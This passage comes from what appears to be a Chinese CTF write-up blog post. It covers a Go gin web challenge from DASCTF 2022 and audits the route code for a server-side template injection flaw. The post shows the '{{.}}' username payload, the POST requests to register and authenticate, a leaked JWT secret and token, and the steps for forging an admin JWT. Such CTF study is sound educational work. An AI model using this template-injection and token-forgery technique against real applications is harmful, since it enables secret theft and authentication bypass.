&amp;acc)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先获取Token,如果有Token则用jwt解密,如果解密成功则显示用户的id，如果没有token直接返回空白</p>
+<h4 id="flag路由"><a href="#flag路由" class="headerlink" title="flag路由"></a>flag路由</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unc flagHandler(c *gin.Context) &#123;</span><br><span class="line">	token := c.GetHeader(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		<span class="keyword">if</span> is_admin == <span class="literal">true</span> &#123;</span><br><span class="line">			p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;Hi &quot;</span> + id + <span class="string">&quot;, flag is &quot;</span> + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(<span class="number">200</span>, <span class="type">string</span>(res))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(<span class="number">403</span>, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">403</span>,</span><br><span class="line">				<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过对传入的X-Token进行jwt解码，然后判断is_admin，如果为true就给flag</p>
+<h4 id="auth路由"><a href="#auth路由" class="headerlink" title="auth路由"></a>auth路由</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">authHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	uid := c.PostForm(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := c.PostForm(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">1024</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	user_acc := get_account(uid)</span><br><span class="line">	<span class="keyword">if</span> user_acc.id != <span class="string">&quot;&quot;</span> &amp;&amp; user_acc.pw == upw &#123;</span><br><span class="line">		token, err := jwt_encode(user_acc.id, user_acc.is_admin)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		p := TokenResp&#123;<span class="literal">true</span>, token&#125;</span><br><span class="line">		res, err := json.Marshal(p)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		c.JSON(<span class="number">200</span>, <span class="type">string</span>(res))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(<span class="number">403</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span>: <span class="number">403</span>,</span><br><span class="line">		<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取用户传入的id和pw，</p>
+<p>理解并分析一下代码：</p>
+<p>如果我们输入了正确的id和pw(get_account有匹配uid的正确结果)，</p>
+<p>返回一个TokenResp的对象（json形式），里面存储了状态status,和jwt token，内容是id和是否为admin</p>
+<h4 id="register-路由"><a href="#register-路由" class="headerlink" title="register 路由"></a>register 路由</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Resist</span><span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">	uid := c.PostForm(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := c.PostForm(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> get_account(uid).id != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">403</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;code&quot;</span>: <span class="number">403</span>,</span><br><span class="line">			<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">4</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, <span class="literal">false</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(<span class="number">200</span>, <span class="type">string</span>(res))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.JSON(<span class="number">200</span>,gin.H&#123;</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Hello World&quot;</span>,<span class="number">.0</span></span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Account&#123;uid, upw, false, secret_key&#125;</code></p>
+<p>路由中默认给is_admin为false，所以我们要想办法给is_admin为true</p>
+<p>由于jwt编码过程中需要用到secret_key作签名密钥，secret_key是环境变量，就需要通过SSTI漏洞把secret_key</p>
+<p>代码审计分析到此结束</p>
+<h3 id="做题分析"><a href="#做题分析" class="headerlink" title="做题分析"></a>做题分析</h3><p>现在我们要利用go ssti注入获取key然后伪造jwt</p>
+<p>go  ssti 参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先说一下go的ssti，和jinja2的ssti类似，都是因为直接渲染拼接的字符导致插入了模板语言后执行</span><br><span class="line">Go 语言内置了 text/template 和 html/template 两个模板库。如果开发人员没有正确使用这些库，可能会导致 SSTI 注入。例如，如果使用 text/template 处理用户输入，并且未对输入进行转义，攻击者可以插入恶意模板代码。</span><br></pre></td></tr></table></figure>
+
+<p>这道题的ssti漏洞产生的位置在</p>
+<p>r.POST(“&#x2F;“, rootHandler)</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	token := c.GetHeader(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(c.Writer, &amp;acc)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>常规思路可以注入<code>&#123;&#123;.&#125;&#125;</code>或<code>&#123;&#123;.secret_key&#125;&#125;</code>来读secret_key属性，但此处由于<code>root_handler()</code>函数得到的acc是数组中的地址，也就是get_account函数通过在全局变量acc数组中查找我们的用户，这种情况下直接注入<code>&#123;&#123;.secret_key&#125;&#125;</code>会返回空，所以此处只能用<code>&#123;&#123;.&#125;&#125;</code>来返回全部属性</p>
+<p>所以我们现在要去注册界面</p>
+<p>访问我们在&#x2F;register页面进行注册</p>
+<p>出现回显</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://8d7710a9-008f-452c-80de-38d1aa7b90cb.node5.buuoj.cn:81/register</span><br><span class="line"><span class="attribute">POST</span>:</span><br><span class="line">id=&#123;&#123;.&#125;&#125;&amp;pw=pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/218ad358431fdef9.png" alt="218ad358431fdef9.png"></p>
+<p>注册完之后我们开始去登录</p>
+<p>然后我们访问&#x2F;auth进行登录，得到token</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://8d7710a9-008f-452c-80de-38d1aa7b90cb.node5.buuoj.cn:81/auth</span><br><span class="line"><span class="attribute">POST</span>:</span><br><span class="line">id=&#123;&#123;.&#125;&#125;&amp;pw=pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/95ffdfdef3087d4f.png" alt="95ffdfdef3087d4f.png"></p>
+<p>我们再回到最开始的页面，将token值传入X-Token头部，成功读到secret_key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.1c8I_PzGiyonSZe3UPM2AB94x07g6DeyJW6uYA2C7eo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/4b87271e7697c76e.png" alt="4b87271e7697c76e.png"></p>
+<p>这样我们就得到了关键的<code>secret_key</code></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fasdf972u1041xu90zm10Av</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改jwt"><a href="#修改jwt" class="headerlink" title="修改jwt"></a>修改jwt</h4><p>我们修改jwt，将is_admin修改为true. （jwt  加密解密网站<a target="_blank" rel="noopener" href="https://www.bejson.com/jwt/">jwt解密&#x2F;加密 - bejson在线工具</a>）</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/7c621e59bf823cc1.png" alt="7c621e59bf823cc1.png"></p>
+<p>先把原来的jwt复制过来解码</p>
+<p>之后我们再放入密钥，改变值为true</p>
+<p>然后点击编码</p>
+<p>复制jwt</p>
+<p>再到&#x2F;flag路由页面，将修改后的jwt传入token中</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/cc9c1867e9b422a3.png" alt="cc9c1867e9b422a3.png"></p>
+<p>总结：这道题和[LineCTF2022]gotm 高度相似，改了点代码（基本步骤都一样）</p>
+<p>go语言代码审计得加强</p>
+<p>jwt 加密解密基本掌握</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2025/07/24/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web-%E5%A4%8D%E7%8E%B0/">http://example.com/2025/07/24/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web-%E5%A4%8D%E7%8E%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%A4%8D%E7%8E%B0/"># 复现</a>
+                    
+                        <a href="/tags/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"># 2022DASCTF MAY 出题人挑战赛</a>
+                    
+                        <a href="/tags/2022/"># 2022</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        <a href="/tags/%E5%88%B7%E9%A2%98/"># 刷题</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/07/22/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/">第一章 应急响应-webshell查杀</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
